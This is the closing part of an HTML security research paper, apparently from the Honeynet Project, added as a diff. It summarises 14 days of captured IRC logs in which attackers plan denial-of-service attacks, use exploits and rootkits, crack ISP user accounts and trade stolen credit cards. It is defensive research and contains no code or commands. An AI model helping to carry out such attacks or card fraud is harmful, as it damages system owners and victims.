+<br>D1ck and J4n3 brag about the systems they have launched Denial of Service attacks
+against.  Later on D1ck teaches J4n3 how to mount a drive. Then they discuss sniffit
+(how to use it) and last, D1ck desperately looks for an Irix exploit and
+rootkit.
+<p>
+
+<li>
+<a href="../motives/day4.txt">Day 4, June
+07</a></li>
+<br>D1ck and J4n3 decided they want to take out India with Denial of Service
+attacks and bind exploits. Later on, they DoS other IRC members who irritate
+them.
+<p>
+
+<li>
+<a href="../motives/day5.txt">Day 5, June
+08</a></li>
+<br>D1ck asks J4n3 to take out three systems for him. D1ck and his elite
+buddy Sp07 try to figure out how a sniffer works "umm doesnt it have to
+be the same network?".
+<p>
+
+<li>
+<a href="../motives/day6.txt">Day 6, June
+09</a></li>
+<br>Our wonder team has been busy, looks like D1ck rooted over 40 systems.
+If they scan enough systems, they can and will gain root.
+<p>
+
+<li>
+<a href="../motives/day7.txt">Day 7, June
+10</a></li>
+<br>Not an exciting day. D1ck teaches a new k1dd13 how to use the sadmind
+exploit. We are not sure if D1ck even knows how to use it himself.
+<p>
+
+<li>
+<a href="../motives/day8.txt">Day 8, June
+11</a></li>
+<br>D1ck and J4n3 discuss systems they own and people they want to DoS.
+D1ck discovers Ping of Death and thinks he is very k3wl.
+<p>
+
+<li>
+<a href="../motives/day9.txt">Day 9, June
+12</a></li>
+<br>Looks like D1ck strikes it big, he finds an ISP and gains access to
+their billing and over 5,000 user accounts. Now they have to figure out
+how to crack them.
+<p>
+
+<li>
+<a href="../motives/day10.txt">Day 10, June
+13</a></li>
+<br>Sp07 joins the gang today. Not the friendliest individual for the Internet
+community. Seems to have taken a wee bit of a dislike to India also.
+<p>
+
+<li>
+<a href="../motives/day11.txt">Day 11, June
+14</a></li>
+<br>They start cracking user passwords and access personal accounts.
+<p>
+
+<li>
+<a href="../motives/day12.txt">Day 12, June
+15</a> Also with 
+<a href="../motives/day12-rom.txt">Romanian
+Translated</a>
+</li>
+<br>D1ck and J4n3 try to find credit card numbers on a Credit Card channel
+so they can buy some domain names.
+<p>
+
+<li>
+<a href="../motives/day13.txt">Day 13, June
+16</a> Also with 
+<a href="../motives/day13-rom.txt">Romanian
+Translated</a>
+</ali>
+<br>D1ck and J4n3 still hangout on the Credit Card channel. Members swap
+credit cards, shell accounts, and porn sites. At the end of the chat session, D1ck
+and J4n3 focus on their website.
+<p>
+
+<li>
+<a href="../motives/day14.txt">Day 14, June
+17</a> Also with 
+<a href="../motives/day14-rom.txt">Romanian
+Translated</a>
+</li>
+<br>D1ck and J4n3 cover how to gain accounts on a Linux box, talk more
+about Credit Cards and continue building a website.</ul>
+<p>
+
+We have just reviewed 14 days in the life of the black-hat community. This
+is not meant to imply that all black-hats think and act like this. In fact,
+we have focused only on a few specific individuals. However, we hope this
+information gives you an idea of what many of the community are capable of. They may
+not be technically competent, or even understand the tools they are using.
+However by focusing on a large number of systems, they can achieve dramatic
+results. This is not a threat to take lightly. They are not concerned about
+what harm they may cause. They focus only on achieving their goals.
+<p>
+<b><font face="Palatino,Book Antiqua"><font size=+2>Conclusion</font></font></b>
+<br>The purpose of this paper is to give you an understanding of the motives
+and psychology of the black-hat community. The paper started off with the
+system compromise of a Solaris 2.6 honeypot. It demonstrated a commonly
+used remote exploit of a vulnerable system. Once compromised, the system
+was quickly controlled with a rootkit, another commonly used tool among
+the black-hat community. However, what makes this paper unique is the look
+you get into the black-hat mentality. Here, you saw in their very own words
+how they think and act, particularly how they can indiscriminately attack and damage
+systems. They randomly probe large numbers of systems and attack the weakest systems 
+they can find. By understanding their motives and methods, you can better protect your systems
+against this threat. 
+<p>
+<b><font face="Palatino,Book Antiqua"><font size=+2>Acknowledgments</font></font></b>
+<br>This paper is the result of the work and research of the Honeynet Project.  The 
+<a href="http://project.honeynet.org">Honeynet Project</a> is a small group
+of security professionals dedicated to learning the tools and tactics of
+the black-hat community and sharing those lessons learned with the security 
+community.  
+<p>
+We would like to thank Alan Paller of <a href="http://www.sans.org">SANS.</a>
+Though not a member of the Honeynet Project, he has helped make this research
+a reality.
+<p>
+<br>
+<center>      
+<a href="http://project.honeynet.org">
+<img src="http://project.honeynet.org/small.gif" alt="The Honeynet Project" border=0>
+</a>
+</center>
+<br>
+<p>
+<br>
+
+</body>
+</html>
